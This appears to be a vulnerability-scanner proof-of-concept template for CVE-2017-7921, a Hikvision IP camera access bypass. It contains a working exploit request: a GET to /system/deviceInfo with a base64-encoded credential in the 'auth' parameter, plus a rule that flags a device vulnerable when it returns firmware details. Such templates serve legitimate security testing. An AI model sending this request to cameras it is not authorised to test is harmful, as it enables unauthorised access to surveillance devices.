detail:
  author: whwlsfb(https://github.com/whwlsfb)
  links:
  - https://packetstormsecurity.com/files/144097/Hikvision-IP-Camera-Access-Bypass.html
expression: r0()
manual: true
name: poc-yaml-hikvision-cve-2017-7921
rules:
  r0:
    expression: response.status == 200 && response.headers["content-type"] == "application/xml"
      && response.body.bcontains(b"<firmwareVersion>")
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /system/deviceInfo?auth=YWRtaW46MTEK
transport: http
